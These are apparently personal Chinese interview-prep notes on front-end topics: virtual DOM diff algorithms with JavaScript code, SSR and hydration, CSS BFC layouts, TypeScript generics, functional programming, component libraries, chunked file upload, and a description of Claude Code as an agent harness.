  const has = newChildren.find(vnode => vnode.key === oldVNode.key);

  // 如果没找到 → 说明这个旧节点不再需要，应该卸载（从 DOM 移除 + 清理资源）
  if (!has) {
    unmount(oldVNode);
  }
}
```

diff 算法的目的是根据 key 复用 dom 节点，通过移动节点而不是创建新节点来减少 dom 操作。
对于每个新的 vnode，在旧的 vnode 中根据 key 查找一下，如果没查找到，那就新增 dom 节点，如果查找到了，那就可以复用。
复用的话要不要移动要判断下下标，如果下标在 lastIndex 之后，就不需要移动，因为本来就在后面，反之就需要移动。
最后，把旧的 vnode 中在新 vnode 中没有的节点从 dom 树中删除。

### 双端 diff

简单 diff 算法能够实现 dom 节点的复用，但有的时候会做一些没必要的移动。双端 diff 算法解决了这个问题，它是从两端进行对比。

原来的顺序是 A, B, C, D，现在变成了 D, C, B, A。

简单 Diff 算法（单端对比）的表现
策略：只从头部开始对比。
第1步：新头 D vs 旧头 A → 不匹配。
第2步：在旧列表中找 D，发现它在最后。
操作：把 D 从末尾移动到开头。
此时内存/虚拟结构变为：D, A, B, C
第3步：新第2个 C vs 旧第2个 A → 不匹配。
第4步：在剩余旧列表找 C，发现它在最后。
操作：把 C 移动到 D 后面。
此时变为：D, C, A, B
...以此类推
结果：简单算法需要进行 3次移动操作（移动 D, C, B），效率较低。它没发现其实只是整体反过来了。

#### 双端 diff

简单 diff 算法能够实现 dom 节点的复用，但有的时候会做一些没必要的移动。双端 diff 算法解决了这个问题，它是从两端进行对比。

我们需要 4 个指针，分别指向新旧两个 vnode 数组的头尾：

![](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/958ae402338c4cf0a4aa6ff5a5484754~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

头和尾的指针向中间移动，直到 oldStartIdx <= oldEndIdx 并且 newStartIdx <= newEndIdx，说明就处理完了全部的节点。

```
// 获取旧虚拟 DOM 节点和新虚拟 DOM 节点的子节点列表
const oldChildren = n1.children;
const newChildren = n2.children;

// ==================== 初始化四个指针 ====================
let oldStartIdx = 0;                          // 旧子节点列表的起始索引（头）
let oldEndIdx = oldChildren.length - 1;       // 旧子节点列表的结束索引（尾）
let newStartIdx = 0;                          // 新子节点列表的起始索引（头）
let newEndIdx = newChildren.length - 1;       // 新子节点列表的结束索引（尾）

// 获取当前四个位置对应的虚拟节点
let oldStartVNode = oldChildren[oldStartIdx];     // 旧头节点
let oldEndVNode = oldChildren[oldEndIdx];         // 旧尾节点
let newStartVNode = newChildren[newStartIdx];     // 新头节点
let newEndVNode = newChildren[newEndIdx];         // 新尾节点

// ==================== 主循环：当新旧列表都还有未处理节点时继续 ====================
while (oldStartIdx <= oldEndIdx && newStartIdx <= newEndIdx) {

  // 【边界检查】如果旧头节点已被标记为 undefined（已移动），则跳过它，前进旧头指针
  if (!oldStartVNode) {
    oldStartVNode = oldChildren[++oldStartIdx];
  }
  // 【边界检查】如果旧尾节点已被标记为 undefined，则跳过它，后退旧尾指针
  else if (!oldEndVNode) {
    oldEndVNode = oldChildren[--oldEndIdx];
  }

  // ==================== 情况一：新头 vs 旧头 → key 相同 ====================
  else if (oldStartVNode.key === newStartVNode.key) {
    // 复用节点，更新内容
    patch(oldStartVNode, newStartVNode, container);
    // 移动指针：旧头++，新头++
    oldStartVNode = oldChildren[++oldStartIdx];
    newStartVNode = newChildren[++newStartIdx];
  }

  // ==================== 情况二：新尾 vs 旧尾 → key 相同 ====================
  else if (oldEndVNode.key === newEndVNode.key) {
    // 复用节点，更新内容
    patch(oldEndVNode, newEndVNode, container);
    // 移动指针：旧尾--，新尾--
    oldEndVNode = oldChildren[--oldEndIdx];
    newEndVNode = newChildren[--newEndIdx];
  }

  // ==================== 情况三：新尾 vs 旧头 → key 相同 ====================
  // 说明旧头节点需要移动到末尾（因为新尾部是它）
  else if (oldStartVNode.key === newEndVNode.key) {
    // 复用节点，更新内容
    patch(oldStartVNode, newEndVNode, container);
    // 将旧头节点对应的 DOM 插入到旧尾节点的下一个兄弟之前（即移到末尾）
    insert(oldStartVNode.el, container, oldEndVNode.el.nextSibling);
    // 移动指针：旧头++，新尾--
    oldStartVNode = oldChildren[++oldStartIdx];
    newEndVNode = newChildren[--newEndIdx];
  }

  // ==================== 情况四：新头 vs 旧尾 → key 相同 ====================
  // 说明旧尾节点需要移动到开头（因为新头部是它）
  else if (oldEndVNode.key === newStartVNode.key) {
    // 复用节点，更新内容
    patch(oldEndVNode, newStartVNode, container);
    // 将旧尾节点对应的 DOM 插入到旧头节点之前（即移到开头）
    insert(oldEndVNode.el, container, oldStartVNode.el);
    // 移动指针：旧尾--，新头++
    oldEndVNode = oldChildren[--oldEndIdx];
    newStartVNode = newChildren[++newStartIdx];
  }

  // ==================== 情况五：以上都不匹配 → 在旧列表中查找新头节点 ====================
  else {
    // 遍历旧子节点列表，寻找与 newStartVNode 拥有相同 key 的节点
    const idxInOld = oldChildren.findIndex(
      node => node && node.key === newStartVNode.key  // 注意：node 可能为 undefined
    );

    if (idxInOld > 0) {
      // 找到了可复用的节点
      const vnodeToMove = oldChildren[idxInOld];
      // 更新该节点内容
      patch(vnodeToMove, newStartVNode, container);
      // 将该节点移动到当前旧头节点的位置（保持顺序）
      insert(vnodeToMove.el, container, oldStartVNode.el);
      // 标记原位置为 undefined，避免重复处理
      oldChildren[idxInOld] = undefined;
    } else {
      // 没找到 → 创建新节点，插入到旧头节点之前
      patch(null, newStartVNode, container, oldStartVNode.el);
    }
    // 无论是否找到，新头指针都要前进
    newStartVNode = newChildren[++newStartIdx];
  }
}

// ==================== 循环结束后，处理剩余节点 ====================

// 如果旧列表先遍历完（oldEndIdx < oldStartIdx），但新列表还有剩余 → 添加新节点
if (oldEndIdx < oldStartIdx && newStartIdx <= newEndIdx) {
  for (let i = newStartIdx; i <= newEndIdx; i++) {
    // 插入位置参考：oldStartVNode.el（此时它可能是下一个待处理节点或容器末尾）
    patch(null, newChildren[i], container, oldStartVNode?.el || null);
  }
}

// 如果新列表先遍历完（newEndIdx < newStartIdx），但旧列表还有剩余 → 移除旧节点
else if (newEndIdx < newStartIdx && oldStartIdx <= oldEndIdx) {
  for (let i = oldStartIdx; i <= oldEndIdx; i++) {
    // 只卸载未被标记为 undefined 的节点（已被移动的节点不需要再卸载）
    if (oldChildren[i]) {
      unmount(oldChildren[i]);
    }
  }
}
```

## 了解SSR吗？

- CSR 
    Client-Side Rendering
    是先返回一个空壳 HTML(#root)，由浏览器通过 JS 渲染页面。
    npm init vite 
    CSR 的原理是前端接管渲染流程(组件渲染在 客户端（即用户的浏览器） 完成)，优点是交互流畅（局部更新实现无刷新交互，避免了整页重载）、前后端分离，但缺点也明显：首屏加载慢（CSR 需下载解析 JS 并请求数据后渲染，过程串行阻塞，导致首屏白屏时间较长， 所以要路由懒加载）、SEO 不友好，因为初始 HTML 几乎没有内容。

    https://juejin.cn/post/7559385680842883099

- SSR
    SSR（Server-Side Rendering）是指React在服务器端将组件和数据渲染为完整HTML字符串后再返回给浏览器

    SSR 的核心逻辑是在服务器拿到数据后，直接生成包含内容的 HTML，再发送到客户端，客户端再进行 hydration（水合）（激活事件绑定）。这样做的最大优势是首屏直出，加载速度快，同时对搜索引擎友好。

    服务端生成的 HTML 虽然内容完整，但缺乏事件监听（如点击、输入）和组件状态。Hydration 就是让 React/Vue 等框架在客户端“接管”这些静态 DOM 节点，为其绑定事件处理程序并恢复应用状态，使页面从“只读”变为“可交互”。

    Hydration 的大白话原理

    就是浏览器拿着已有的 HTML，让 JS 重新跑一遍代码做对比，确认没毛病后，把点击事件贴上去。

    核心模块/功能
    复用 DOM：不重新画页面，直接利用服务器返回的现成 HTML。
    
    事件绑定：给静态标签挂上点击、输入等交互功能。

    SSR 本质上解决的是首屏性能和 SEO 问题，但也带来服务器压力大、开发复杂度高的问题。

    场景上，CSR 更适合后台管理系统、强交互应用，IOS/Android 很多页面其实都是WebView, 不在乎SEO, 开发快速，兼容多平台；SSR 更适合内容型网站、电商、营销页等对首屏速度和 SEO 要求高的业务。



## 利用cursor vibe一个节点连线的项目 包含 登录系统

1. 逆向思维



## 常用布局

### BFC

BFC（Block Formatting Context，块级格式化上下文）是 CSS 中独立的布局区域，核心规则分「创建规则」「布局规则」「交互规则」三类

- 如何创建 BFC
满足以下任一条件，元素即建立新 BFC
1. 根元素（<html>）—— 页面默认根 BFC
2. 浮动元素：float: left/right（float: none 不算）
3. 绝对 / 固定 / 粘性定位：position: absolute/fixed/sticky
4. 行内块：display: inline-block
5. 表格相关：display: table-cell（表格单元格）、table-caption（表格标题）、匿名表格单元格
6. 溢出非可见：overflow: auto/hidden/scroll（overflow: visible 不触发）
7. 弹性 / 网格项：flex/inline-flex/grid/inline-grid

- BFC 内部的布局规则
  1. 垂直排列：BFC 内块级盒子从上到下依次垂直排列，无横向排列
  2. 边距折叠：相邻块级盒子的垂直 margin 会折叠（取最大值，非相加），仅同 BFC 内生效
  3. 触边对齐：每个盒子左外边缘（LTR 排版）紧贴 BFC 容器左边缘，即使有浮动也如此
  4. 独立计算：BFC 是独立渲染区域，内部布局不受外部影响，外部也不影响内部
- BFC 与外部的交互规则
  1. 包含内部浮动：BFC 会包裹所有内部浮动元素（解决父元素高度塌陷）
  2. 排除外部浮动：BFC 区域不与外部浮动元素重叠（实现两栏自适应，避免文字环绕）
  3. 抑制 margin 折叠：BFC 会阻止内部与外部的 margin 折叠，隔离内外布局


![](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4a73e2276d8b41f0a905361f151157e2~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp)

https://juejin.cn/post/6941206439624966152#heading-47

方法一：float + overflow（BFC 原理）

BFC 的区域不会与浮动元素（Float）的区域发生重叠。

浮动元素离开文档流， 本来左侧会贴着外层盒子的左侧， 但是overflow:hidden后， 该元素生成一个 BFC
会避开浮动元素占据的空间，不会像普通非 BFC 块级元素那样被浮动元素覆盖（文字环绕效果除外），从而实现了自适应宽度的两列布局。

不用bfc 行不行？ 
方法二： float + margin 
margin 让出位置

方法三：flex
BFC 
FFC 全称 Flex Formatting Context 
一维布局：FFC 沿主轴（flex-direction 定义）或交叉轴排列，而非 BFC 的垂直堆叠。
弹性伸缩：项目可通过 flex 属性自适应分配剩余空间，BFC 无此能力。

方法四：grid
网格布局

### 三栏布局
专栏在前
方法一：圣杯布局
父容器留白，中间栏占满宽度，左右栏通过负边距和相对定位，嵌入父容器的留白区域。

### 双飞翼布局
给中间栏套个内层容器并设左右外边距，左右栏用负边距拉上来，正好嵌进内层容器的留白区域。

### 方法三：float + overflow（BFC 原理）
BFC 区域不会与浮动元素的盒子重叠。

### 方法四：flex


### 方法五：grid

## 你觉得typescript解决了什么问题?你觉得它用什么方式解决的？

面试官想考察你是否真正理解 TypeScript 的“存在意义 + 工程价值”，以及你有没有“大型项目视角”。

一、先从 JS 的缺点切入

我觉得 TypeScript 本质是在解决 JavaScript 在大型工程化场景下的“不可控性”问题”。

1. 动态类型 → 运行时风险高
```
function add(a, b) {
  return a + b;
}

add(1, "2");
```
类型不确定
bug 在运行时才暴露
难以测试覆盖所有分支

2. 接口不清晰 → 协作困难
function createUser(user) {
  // user 到底有什么字段？不清楚
}

靠文档/口头约定

3. 大型项目可维护性差

重构困难（不敢删代码）
IDE 无法准确提示
隐式依赖多


TS 是怎么解决的

TypeScript 通过静态类型系统 + 编译期检查，把问题从运行时提前到开发阶段。

1. 静态类型检查（核心能力）

function add(a: number, b: number): number {
  return a + b;
}

add(1, "2");

提前发现错误
降低线上事故

2. 类型即文档（非常加分点）

interface User {
  id: number;
  name: string;
  age?: number;
}

function createUser(user: User) {}


不需要额外文档
IDE 自动提示
降低沟通成本

3. 强大的类型表达能力（重点说）
TS 不只是“加类型”，而是：

泛型
联合类型
条件类型
映射类型

type ApiResponse<T> = {
  code: number;
  data: T;
  message: string;
};


类型可以复用
可以描述复杂数据结构

4. 重构友好（工程价值）

interface User {
  name: string;
}

// 改字段
interface User {
  username: string;
}

全局报错提醒
精准定位影响范围


三、结合“大型项目”

在大型项目（比如上万行代码、多人协作）中，TypeScript 的价值会被放大。

claude code 几十万行ts 代码

react, vue 都是ts 写的

nest.js 原生ts

### 缺点

增加开发成本
类型设计复杂度高
学习曲线陡峭

### 总结
TypeScript 主要解决的是 JavaScript 在大型项目中的不可控问题，比如动态类型导致的运行时错误、接口不清晰带来的协作成本、以及重构困难等。
它通过静态类型系统，在编译阶段做类型检查，把错误前置，同时用类型来约束数据结构，相当于“类型即文档”。
在大型项目中，比如 AI Agent 这种复杂系统，TS 可以保证模块之间的接口一致性，提高可维护性和开发效率。
本质上我觉得 TS 是在 JavaScript 之上增加了一层工程化约束，让代码更可靠、更可维护。


## 泛型解决了什么问题?你觉得它具体用了哪种思想?

我觉得泛型本质是在解决“类型不确定但逻辑一致”的问题

```
没有泛型
function getNumber(arr: number[]): number {
  return arr[0];
}

function getString(arr: string[]): string {
  return arr[0];
}
```
逻辑完全一样
但要写很多份
扩展性极差

二、泛型怎么解决（第一层理解
```
function getFirst<T>(arr: T[]): T {
  return arr[0];
}
```
泛型就是：把“类型”当参数传进去。

泛型其实是一种“类型层面的抽象”，就像函数参数是对“值”的抽象，泛型是对“类型”的抽象。

- 实际工程场景
场景 1：API 封装

```
type ApiResponse<T> = {
  code: number;
  data: T;
};
```
不同接口复用结构
类型安全

场景 2：React（非常常见）
function useState<T>(initial: T): [T, (v: T) => void]

泛型保证：

state 类型一致
setState 不会乱传

场景 3：工具函数

function merge<T, U>(a: T, b: U): T & U {
  return { ...a, ...b };
}

使用到的思想

- 抽象
  泛型本质是对“类型”的抽象。
- 参数化思想
  泛型其实是“参数化类型”，也就是把类型当成参数传入。
- 多态
  泛型体现的是“参数化多态”，也就是同一套代码可以适用于多种类型，而不需要为每种类型写不同实现
- 类型约束思想
  function getValue<T, K extends keyof T>(obj: T, key: K): T[K] {
    return obj[key];
  }
  K extends keyof T 表示K 必须是 T 类型对象上已存在的键名，用来约束 key 只能传对象真实拥有的属性。
- 类型关系表达
  泛型真正强大的地方在于，它不仅能表示“一个类型”，还能表达“多个类型之间的关系”。

### 总结
我觉得泛型主要体现了参数化多态的思想，本质是对类型的一种抽象。
就像函数参数是对值的抽象，泛型是对类型的抽象，把类型当成参数传入，从而让同一套逻辑可以适用于多种类型。
同时它还支持类型约束，比如通过 extends 可以限制类型范围，保证类型之间的关系是正确的。
和传统继承多态不同，泛型是“同一实现适配多种类型”，而不是不同类型写不同实现。
这个思想在 C++ 的 template 中也有体现，只不过 TypeScript 是在类型系统层面做约束，而不是生成实际代码。

## 介绍一下你对函数式编程的认识

函数是一等对象，指的是函数可以像普通值一样被传递、赋值、作为参数或返回值（高阶函数）使用。
闭包是函数 + 其词法作用域的组合，使函数可以“记住”并访问定义时的变量。在数据封装（私有变量）、防抖 / 节流、记忆函数、函数柯里化等
es6 map, reduce filter等也是函数式编程思想

但这些只是函数式编程的基础

函数式编程本质是一种“以函数为核心、强调数据不可变和无副作用”的编程范式，它通过组合小函数来构建复杂逻辑。


关键词先抛出来：

纯函数
不可变数据
函数组合

1. 纯函数（最核心）

👉 定义：

相同输入一定得到相同输出，并且没有副作用。

let count = 0;

function add() {
  count++;
}

依赖外部状态
不可预测

纯函数
function add(a, b) {
  return a + b;
}
纯函数更容易测试、复用和推导，这也是 React 渲染逻辑强调纯函数的原因。

2. 不可变数据（Immutable）
核心思想：

不修改原数据，而是返回新数据。
可变写法
arr.push(4);

函数式写法
const newArr = [...arr, 4];

价值：

避免副作用
更容易做状态对比（React diff）

函数组合（Composition）

👉 用小函数拼装复杂逻辑

示例（ES6 + reduce）
const compose = (...fns) => (x) =>
  fns.reduceRight((val, fn) => fn(val), x);

const add1 = x => x + 1;
const mul2 = x => x * 2;

compose(mul2, add1)(3); // (3+1)*2 = 8

reduce 在函数式里本质是“把一组操作折叠成一个结果”。

React 本质是函数式 UI

React 的函数组件本质就是一个纯函数：输入 props，输出 UI。

function Button({ text }) {
  return <button>{text}</button>;
}

Hooks 是函数式思想的体现

👉 关键点：

Hooks 通过函数组合来复用状态逻辑，而不是通过 class 继承

function useCounter() {
  const [count, setCount] = useState(0);
  return { count, setCount };
}

把逻辑拆成函数
再组合使用

不可变数据在 React 中的作用

setState(prev => ({ ...prev, count: prev.count + 1 }));

React 依赖引用变化来做 diff，不可变数据可以让更新更可预测。

四、原生 JS 场景（必须覆盖）

const sum = arr.reduce((acc, cur) => acc + cur, 0);

reduce 本质是一个高阶函数，可以把集合“归约”为一个值，是函数式编程中非常核心的工具。

map / filter

arr.map(x => x * 2).filter(x => x > 5);

无副作用
链式调用
声明式编程（描述“做什么”，而不是“怎么做” 命令式）

后端视角（加分项）

你可以补一句👇

在后端函数式编程也很常见，比如 Node.js 中的中间件机制，本质就是函数组合。

## 总结

我理解函数式编程是一种以函数为核心的编程范式，核心思想包括纯函数、不可变数据和函数组合。
纯函数保证相同输入得到相同输出，避免副作用；不可变数据让状态变化更可预测；函数组合则通过拼装小函数来构建复杂逻辑。
在 React 中，这种思想体现得很明显，比如函数组件本质是纯函数，Hooks 通过函数组合复用逻辑，同时依赖不可变数据来做高效更新。
在原生 JS 中，像 map、filter、reduce 也是典型的函数式写法，而在后端中间件机制中，本质也是函数组合。
我觉得函数式编程的核心价值在于让代码更可预测、更易维护，同时提升复用性。









和闭包是 JavaScript 的核心语言特性，它们让函数可以像值一样传递和组合，同时闭包可以让函数持有状态。
这些能力是函数式编程的基础，比如高阶函数、函数组合、Hooks 本质上都依赖这些特性。
但严格来说，它们不等同于函数式编程，函数式编程更强调的是纯函数、不可变数据和无副作用。
可以理解为，这些是“工具”，而函数式编程是一种“使用这些工具的编程思想”。

## 组件库用过什么？ 自己封装过吗?

面试官想听啥？
UI 体系的理解 + 工程化能力 + 选型能力

- UI 组件库在项目中的地位
在前端项目里，UI 组件库其实是非常核心的一层，它不仅决定了页面的开发效率，还直接影响整体的设计一致性、可维护性以及用户体验。
一个成熟的组件库可以帮我们减少大量重复开发，同时在交互规范、视觉规范上提供统一标准。

- 在实际项目中，我主要使用的是 ShadCN
它和传统组件库最大的不同是，它不是黑盒组件，而是可复制源码的组件方案，这一点对工程非常友好。
npx shadcn@latest add card
components/ui/card/card.tsx
  - 每个组件都是源码级别的，可以按需修改，而不是被组件库限制。
  - 它基于 Tailwind CSS，样式是原子化的，在做定制 UI 或响应式适配时非常灵活。
  - 在需要品牌化 UI 或设计系统的项目中，比传统组件库更容易做二次封装。

- 在后台管理系统中，我更多会使用 Ant Design 这类成熟组件库。
  - 企业级后台标准
  Ant Design 提供了非常完整的组件体系，比如表格、表单、权限控制相关 UI，适合中后台开发。
  - 开箱即用 + 规范完善
  它内置了很多设计规范，可以快速搭建 CRUD 系统。
  - 生态成熟

- 图标库
  lucide-react

- 动画库 Framer Motion

## 大文件上传

大文件上传我一般会做成“切片上传方案”。首先用 Blob.slice 把文件拆成多个 chunk，然后基于 HTTP/2 / HTTP/3 的多路复用能力并发上传，提高带宽利用率。

同时会计算文件 hash 作为唯一标识，用于实现秒传和断点续传：上传前先和服务端对比已有分片，只上传缺失部分。

上传过程中会做并发控制和失败重试，避免请求过多或局部失败影响整体。最后由服务端按顺序合并切片。

整体就是把上传过程做成一个“可并发、可恢复、可校验”的系统，提高稳定性和用户体验。

https://juejin.cn/post/7385098943942934582?searchId=20260409102233A4A0CBAB494B136C0794#heading-25

## harness

- Claude Code 是 Anthropic 推出的命令行编程Agent，优点是可直接在终端中高效生成和修改代码、上下文理解强、适合复杂项目开发。

Claude Code 比cursor 更懂功能， 为什么这么说呢？
也是 规范驱动编程  CLAUDE.md 技术栈啥的， 配 Skills， 加MCP，但更强。  答案藏在一个词里：Harness。

Claude Code serves as the agentic harness around Claude: it provides the tools, context management, and execution environment that turn a language model into a capable coding agent.

Claude Code 是一个智能体编排框架，包裹在 Claude 模型外面。它提供工具、上下文管理和执行环境，把一个语言模型变成一个有能力的编码 Agent。

### 什么是harness?

![](https://static001.geekbang.org/resource/image/92/66/92ec57e344e5f963467a4054f616c366.png)
Harness 像“缰绳”，让大模型可控执行任务，提升安全性、稳定性与工程落地能力。

定义里有三个关键词，工具、上下文管理、执行环境。模型本身只会生成文本。是 Harness 给了它读文件的能力、写代码的能力、搜索代码库的能力、在终端执行命令的能力。没有 Harness，Claude 就是一个只会说话的大脑——有智力，没有手脚。

![](https://static001.geekbang.org/resource/image/5c/2b/5c73e5d6313819828d739eeb2bfca72b.png?wh=1536x1024)


Agent Harness = 包裹 LLM 的运行时基础设施，管理工具调度、上下文工程、安全执行、状态持久化和会话连续性。LLM 只负责推理决策。2026 年的关键洞察：竞争差异化的重心已从 Model 转移到 Harness。

Agent = Model + Harness。

图中最核心的位置是  Model——那个蓝色芯片图标，代表 Claude 的大语言模型。但模型本身只是一个推理引擎，它不能独立行动。

真正让它变成 Agent 的，是包裹在它周围的五个 Harness 组件。

Tools（工具），模型的手脚。Read、Write、Edit、Bash、Grep……这些工具赋予模型与文件系统、终端、网络交互的能力。没有工具，模型只能说，不能做。

Context（上下文），模型的记忆加载器。CLAUDE.md、系统提示词、对话历史、工具定义——这些上下文在每一轮循环中被注入模型，决定了模型看到什么、知道什么。上下文管理的精妙之处是，它不仅是被动的信息传递，还包括主动的压缩和重注入策略。

Memory（记忆），模型的长期存储。跨会话的记忆持久化，让模型能“记住”你的偏好、项目规则和历史决策。CLAUDE.md 是显式记忆，自动记忆（~/.claude/memory/）是隐式记忆。没有 Memory，每次对话都从零开始。

Hooks（钩子），模型的神经反射。事件驱动的自动化机制，在工具执行前后触发自定义逻辑。比如每次保存文件前自动格式化，每次提交前自动运行 lint。Hooks 让 Harness 有了“条件反射”的能力——不需要模型主动决策，某些行为会自动发生。

回家先洗手、睡前刷牙，这些都是固定触发的习惯动作

Permissions（权限）——模型的安全围栏。哪些工具可以自由使用，哪些需要人工审批，哪些完全禁止——权限系统是 Harness 的安全底线。它解决了一个核心矛盾：你希望 Agent 足够自主以提高效率，但又不希望它自主到失控。


Model 在中心，五个组件围绕它排列，整体被一个名为 Harness 的边框包裹。这不是随意的布局，它精确表达了一个架构事实：模型不直接接触外部世界，所有交互都通过 Harness 的组件中转。Harness 是模型和现实之间的唯一接口。

这五个组件也不是孤立的。Tools 的执行结果变成 Context 的一部分；Hooks 在 Tools 执行前后触发；Permissions 决定哪些 Tools 可以被调用；Memory 用于跨会话保留 Context 中的关键信息。它们构成了一个协同运转的系统，少了任何一个，Agent 的能力都会大打折扣。

![](https://static001.geekbang.org/resource/image/20/b9/20ffc62d48e79a3f7beaee728bb21bb9.jpg?wh=2868x2150)

Agentic Loop——Harness 的心脏如果 Harness 是一台机器，Agentic Loop 就是它的发动机。整个 Claude Code 的运转，归根到底就是一个循环：

![](https://static001.geekbang.org/resource/image/22/dd/228da3c3689802fea8a444dab5a8aedd.jpg?wh=3247x2315)

关键点在于步骤 ② 和步骤 ④  之间的循环。模型不是一次性给出最终答案的。它可能先读一个文件，看完结果后决定再搜索一下，搜索完又决定编辑某行代码，编辑完再运行测试——每一步都是一次循环。一个复杂任务可能跑几十轮循环。循环什么时候结束？满足下面两个条件之一即可：模型主动停止——Claude 认为任务完成，生成纯文本回复，不再请求工具调用。API 返回  stop_reason: "end_turn"。达到最大轮次——Harness 设置了  --max-turns  限制，防止无限循环。


内置工具——Harness 的手脚Agentic Loop 是引擎，工具是车轮。Claude Code 内置了 20+ 个左右的工具，覆盖了软件工程的五个原子操作。

工具设计背后有一个深刻的哲学，少而精。Claude Code 没有内置重构工具、测试工具、部署工具……它只给了最基础的原语。重构是 Read + Edit + Bash 的组合涌现；测试是 Bash + Read 的组合涌现；部署还是 Bash。这就像计算机只需要几条指令就能图灵完备一样。Harness 不需要为每种场景造一个工具，它只需要确保基础工具的组合空间足够大。但 Bash 是个例外。Bash 工具是一个图灵完备的逃逸舱。通过它，Claude 可以执行任何 Shell 命令：安装依赖、运行测试、调用 API、操作数据库。这意味着 Claude Code 的能力上限，理论上等于操作系统的能力上限。这也是为什么 Harness 需要权限控制的原因。


上下文管理——被忽视的关键能力大多数人讨论 Agent 框架时，只关心工具和循环。但 Harness 最精巧的部分，其实是上下文管理。Claude 的上下文窗口是有限的（200K tokens）。一个真实的编码任务——读 20 个文件、搜索 50 次、执行 30 条命令——产生的对话历史会迅速膨胀到几十万 tokens。如果不管理，要么爆掉上下文窗口，要么模型开始“遗忘”早期信息。Claude Code 的解决方案是自动压缩。当对话历史接近上下文窗口的 92% 时，Harness 会触发一次压缩操作：

对话历史（180K tokens）
    │
    ▼ 压缩触发
┌────────────────────────────┐
│ 保留：最近的消息（完整）      │
│ 压缩：早期消息 → 摘要        │
│ 重注入：CLAUDE.md 内容       │
│ 重注入：系统提示词            │
│ 重注入：工具定义              │
└────────────────────────────┘
    │
    ▼
压缩后对话历史（~80K tokens）
    │
    ▼ 继续工作

注意最后三行，CLAUDE.md、系统提示词、工具定义在每次压缩后都会重新注入。这意味着即使对话历史被截断了，模型仍然知道项目的规则、自己有哪些工具、应该遵循什么约定。这就是为什么你在 CLAUDE.md 里写的东西那么“持久”——不是因为模型记住了它，而是 Harness 在每次压缩后都重新塞给模型。


为什么 2026 年是 Harness 之年？2025 年的关键词是 Agent。2026 年的关键词是  Agent Harness。为什么？因为行业已经意识到。模型本身正在商品化——Claude、GPT、Gemini、DeepSeek 的能力差距在缩小。但同一个模型在不同 Harness 中的表现差距，远大于不同模型在同一个 Harness 中的差距。换句话说，Harness 比模型更重要。这不是我的臆断。有几个数据点足以佐证：Claude Code 在 2025 年 11 月达到  10 亿美元年化收入——这是一个 Harness 产品的收入，不是模型本身的收入。Anthropic 在 2026 年 3 月收购了  Bun（JavaScript 运行时），明确表示要加强 Claude Code 的基础设施。收购一个运行时来加强一个 Harness——这说明 Anthropic 把 Harness 视为战略级资产。开源社区出现了“Agent Harness“作为独立品类。GitHub 上以 “harness” 为关键词的新仓库数量在 2026 年 Q1 翻了三倍。对于我们开发者来说，这意味着什么？理解 Harness 比理解模型更重要。模型的能力由 Anthropic/OpenAI 决定，你无法改变。但 Harness 的配置——CLAUDE.md 怎么写、工具权限怎么设、Hooks 怎么接、MCP 怎么连——这些全在你手中。你前面学的每一讲，本质上都是在调教 Harness。


动手验证：感受 Harness 的存在最后来一个非常简单的实验，只是感受 Harness 的作用（其实我们每天都在感受着这种不同）。用裸 API 和 Claude Code 分别执行同一个任务：# 方式一：裸 API 调用（没有 Harness）- 你可以换成Deepseek或GPT等任何模型curl https://api.anthropic.com/v1/messages \ -H "x-api-key: $ANTHROPIC_API_KEY" \ -H "content-type: application/json" \ -H "anthropic-version: 2023-06-01" \ -d '{ "model": "claude-sonnet-4-6-20260320", "max_tokens": 1024, "messages": [{"role":"user","content":"找出当前目录下所有 TODO 注释并列出文件名和行号"}] }'# 方式二：通过 Harness（Claude Code）claude -p "找出当前目录下所有 TODO 注释并列出文件名和行号" --output-format text裸 API 会怎么回答？它会告诉你“你可以用 grep 命令来搜索”——因为它没有手脚，只能说。Claude Code 会怎么做？它会直接执行  Grep  工具搜索 TODO，然后返回完整的文件名、行号和上下文——因为 Harness 给了它行动的能力。同一个大脑，有没有 Harness，结果天壤之别。


总结一下这一讲我们从底层理解了 Claude Code 的真实身份——它是一个  Harness，一个包裹在 Claude 模型外面的智能体编排框架。我们再回顾一下核心要点。1.Harness = 工具 + 上下文管理 + 执行环境 + 权限控制。它把模型的智力转化为行动力。2.Agentic Loop 是 Harness 的心脏。“推理 → 工具调用 → 结果回注 → 继续推理”的循环是所有复杂行为的涌现基础。3.20+ 个内置工具覆盖 5 个原子操作（读、写、执行、联网、编排）。少而精的设计让组合空间最大化。4.上下文管理是被低估的关键能力。自动压缩 + CLAUDE.md 重注入，确保模型在长任务中不丢失关键信息。5.Claude Code 不是开源软件。核心 Harness 代码以编译后的 npm 包分发。Agent SDK 提供了可编程的 Harness 接口。6.2026 年是 Harness 之年。同一模型在不同 Harness 中的表现差距，大于不同模型在同一 Harness 中的差距。因此理解 Harness 比理解模型更重要。
